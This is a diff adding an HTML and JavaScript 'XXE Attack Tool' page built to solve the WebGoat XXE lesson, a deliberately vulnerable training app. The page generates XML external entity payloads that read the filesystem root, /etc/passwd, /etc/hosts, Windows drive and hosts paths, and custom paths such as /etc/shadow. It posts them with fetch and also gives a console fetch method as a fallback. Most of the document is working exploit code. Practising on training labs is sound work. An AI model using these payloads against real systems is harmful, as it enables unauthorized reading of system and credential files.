@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XXE Attack Tool</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            max-width: 1000px;
+            margin: 30px auto;
+            padding: 30px;
+            background: linear-gradient(135deg, #e53935 0%, #b71c1c 100%);
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #b71c1c;
+            margin-top: 0;
+            border-bottom: 3px solid #e53935;
+            padding-bottom: 15px;
+        }
+        .alert {
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+            border-left: 5px solid;
+        }
+        .alert-info { background: #e3f2fd; border-color: #2196F3; color: #0d47a1; }
+        .alert-success { background: #e8f5e9; border-color: #4caf50; color: #1b5e20; }
+        .alert-warning { background: #fff3cd; border-color: #ff9800; color: #e65100; }
+        .section {
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            border-left: 4px solid #e53935;
+        }
+        label {
+            display: block;
+            font-weight: bold;
+            margin: 15px 0 5px 0;
+            color: #333;
+        }
+        input[type="text"], select, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: monospace;
+            box-sizing: border-box;
+        }
+        textarea {
+            min-height: 150px;
+            font-family: 'Courier New', monospace;
+        }
+        button {
+            background: linear-gradient(135deg, #e53935 0%, #b71c1c 100%);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px 5px 10px 0;
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(229, 57, 53, 0.4);
+        }
+        button.secondary {
+            background: linear-gradient(135deg, #757575 0%, #424242 100%);
+        }
+        code {
+            background: #e8eaf6;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #5e35b1;
+        }
+        #response {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background: #f5f5f5;
+            border-radius: 8px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .payload-btn {
+            margin: 5px;
+            padding: 8px 15px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 XXE Attack Tool</h1>
+        
+        <div class="alert alert-warning">
+            <strong>⚠️ WARNING:</strong> This tool performs XXE (XML External Entity) attacks.
+            Only use on systems you have permission to test!
+        </div>
+
+        <div class="alert alert-info">
+            <strong>📝 Challenge:</strong> Submit a comment with XXE injection to list the root directory of the filesystem.
+        </div>
+
+        <div class="section">
+            <h3>Step 1: Configuration</h3>
+            
+            <label>WebGoat Base URL:</label>
+            <input type="text" id="baseUrl" value="http://192.168.254.112:8001" />
+            
+            <label>XXE Endpoint:</label>
+            <input type="text" id="endpoint" value="/WebGoat/xxe/simple" placeholder="e.g., /WebGoat/xxe/simple" />
+            <small style="color: #666;">Check Network tab in DevTools to find the correct endpoint</small>
+        </div>
+
+        <div class="section">
+            <h3>Step 2: Choose Attack Type</h3>
+            
+            <label>Select Payload:</label>
+            <select id="payloadType" onchange="updatePayload()">
+                <option value="root">List Root Directory (/)</option>
+                <option value="passwd">Read /etc/passwd</option>
+                <option value="hosts">Read /etc/hosts</option>
+                <option value="win">List C:\ Drive (Windows)</option>
+                <option value="winhosts">Read Windows hosts file</option>
+                <option value="custom">Custom File Path</option>
+            </select>
+            
+            <div id="customPath" style="display:none; margin-top: 10px;">
+                <label>Custom File Path:</label>
+                <input type="text" id="customFile" placeholder="e.g., /etc/shadow or file:///etc/shadow" />
+            </div>
+
+            <div style="margin-top: 15px;">
+                <strong>Quick Payloads:</strong><br>
+                <button class="payload-btn secondary" onclick="setPayload('root')">Root /</button>
+                <button class="payload-btn secondary" onclick="setPayload('passwd')">/etc/passwd</button>
+                <button class="payload-btn secondary" onclick="setPayload('hosts')">/etc/hosts</button>
+                <button class="payload-btn secondary" onclick="setPayload('win')">C:\</button>
+            </div>
+        </div>
+
+        <div class="section">
+            <h3>Step 3: XXE Payload</h3>
+            
+            <label>XML Payload (edit if needed):</label>
+            <textarea id="payload"></textarea>
+            
+            <button onclick="copyPayload()" class="secondary">📋 Copy Payload</button>
+            <button onclick="resetPayload()" class="secondary">🔄 Reset</button>
+        </div>
+
+        <div class="section">
+            <h3>Step 4: Execute Attack</h3>
+            
+            <button onclick="executeXXE()">🚀 Send XXE Attack</button>
+            <button onclick="openDevTools()" class="secondary">📖 Show DevTools Method</button>
+        </div>
+
+        <div id="response"></div>
+
+        <div id="devToolsHelp" style="display:none;" class="alert alert-info">
+            <h4>🛠️ Using Browser DevTools (Recommended):</h4>
+            <ol>
+                <li>Open WebGoat XXE lesson in another tab</li>
+                <li>Open DevTools (F12) → Network tab</li>
+                <li>Submit a normal comment to see the request</li>
+                <li>Right-click the POST request → Copy → Copy as Fetch</li>
+                <li>Open Console tab, paste the fetch command</li>
+                <li>Replace the body with this XXE payload (copied above)</li>
+                <li>Press Enter to execute</li>
+            </ol>
+            <strong>Example Fetch Command:</strong>
+            <pre style="background:#2d2d2d;color:#f8f8f2;padding:10px;border-radius:5px;overflow-x:auto;">fetch("http://192.168.254.112:8001/WebGoat/xxe/simple", {
+  method: "POST",
+  headers: {"Content-Type": "application/xml"},
+  body: '&lt;!DOCTYPE comment [&lt;!ENTITY xxe SYSTEM "file:///"&gt;]&gt;&lt;comment&gt;&lt;text&gt;&xxe;&lt;/text&gt;&lt;/comment&gt;'
+}).then(r =&gt; r.text()).then(console.log);</pre>
+        </div>
+    </div>
+
+    <script>
+        const payloads = {
+            root: 'file:///',
+            passwd: 'file:///etc/passwd',
+            hosts: 'file:///etc/hosts',
+            win: 'file:///c:/',
+            winhosts: 'file:///c:/windows/system32/drivers/etc/hosts'
+        };
+
+        function updatePayload() {
+            const type = document.getElementById('payloadType').value;
+            const customDiv = document.getElementById('customPath');
+            
+            if (type === 'custom') {
+                customDiv.style.display = 'block';
+            } else {
+                customDiv.style.display = 'none';
+                generatePayload(payloads[type]);
+            }
+        }
+
+        function setPayload(type) {
+            document.getElementById('payloadType').value = type;
+            generatePayload(payloads[type]);
+        }
+
+        function generatePayload(filePath) {
+            const payload = `<?xml version="1.0"?>
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "${filePath}">
+]>
+<comment>
+  <text>&xxe;</text>
+</comment>`;
+            document.getElementById('payload').value = payload;
+        }
+
+        function resetPayload() {
+            updatePayload();
+        }
+
+        function copyPayload() {
+            const payload = document.getElementById('payload').value;
+            navigator.clipboard.writeText(payload).then(() => {
+                alert('✅ Payload copied to clipboard!');
+            });
+        }
+
+        function openDevTools() {
+            const help = document.getElementById('devToolsHelp');
+            help.style.display = help.style.display === 'none' ? 'block' : 'none';
+        }
+
+        async function executeXXE() {
+            const baseUrl = document.getElementById('baseUrl').value.trim();
+            const endpoint = document.getElementById('endpoint').value.trim();
+            const payload = document.getElementById('payload').value;
+            
+            if (!baseUrl || !endpoint) {
+                alert('Please fill in the URL and endpoint!');
+                return;
+            }
+
+            // Check for custom path
+            const payloadType = document.getElementById('payloadType').value;
+            if (payloadType === 'custom') {
+                const customFile = document.getElementById('customFile').value.trim();
+                if (!customFile) {
+                    alert('Please enter a custom file path!');
+                    return;
+                }
+                let filePath = customFile;
+                if (!filePath.startsWith('file://')) {
+                    filePath = 'file://' + filePath;
+                }
+                generatePayload(filePath);
+            }
+
+            const fullUrl = baseUrl + endpoint;
+            const responseDiv = document.getElementById('response');
+            
+            responseDiv.style.display = 'block';
+            responseDiv.innerHTML = `
+                <div style="color: #ff9800;">
+                    <strong>🔄 Sending XXE attack...</strong><br>
+                    URL: ${fullUrl}<br>
+                    <small>Note: This may fail due to CORS. Use DevTools method if this doesn't work.</small>
+                </div>
+            `;
+
+            try {
+                const response = await fetch(fullUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/xml'
+                    },
+                    body: payload
+                });
+
+                const text = await response.text();
+                
+                responseDiv.innerHTML = `
+                    <div style="background: #e8f5e9; padding: 15px; border-radius: 5px; border-left: 4px solid #4caf50;">
+                        <h3 style="color: #1b5e20; margin-top: 0;">✅ Response Received!</h3>
+                        <p><strong>Status:</strong> ${response.status} ${response.statusText}</p>
+                        <p><strong>Response:</strong></p>
+                        <pre style="background: #fff; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;">${escapeHtml(text)}</pre>
+                        <hr>
+                        <p><strong>Next Steps:</strong></p>
+                        <ul>
+                            <li>Check if the response contains file/directory listing</li>
+                            <li>Go to WebGoat and verify if lesson is complete</li>
+                            <li>If not successful, try other payloads</li>
+                        </ul>
+                    </div>
+                `;
+
+                console.log('XXE Response:', text);
+
+            } catch (error) {
+                responseDiv.innerHTML = `
+                    <div style="background: #ffebee; padding: 15px; border-radius: 5px; border-left: 4px solid #f44336;">
+                        <h3 style="color: #b71c1c; margin-top: 0;">❌ Request Failed</h3>
+                        <p><strong>Error:</strong> ${error.message}</p>
+                        <p><strong>This is likely due to CORS restrictions.</strong></p>
+                        <hr>
+                        <p><strong>Recommended Solution - Use DevTools:</strong></p>
+                        <ol>
+                            <li>Click "📖 Show DevTools Method" above</li>
+                            <li>Follow the instructions to execute via Console</li>
+                            <li>Or use the PowerShell script: <code>xxe_attack.ps1</code></li>
+                        </ol>
+                    </div>
+                `;
+
+                console.error('XXE Attack Error:', error);
+            }
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Initialize with default payload
+        window.onload = function() {
+            updatePayload();
+            console.log('XXE Attack Tool Loaded');
+            console.log('Target: WebGoat XXE Lesson');
+        };
+    </script>
+</body>
+</html>
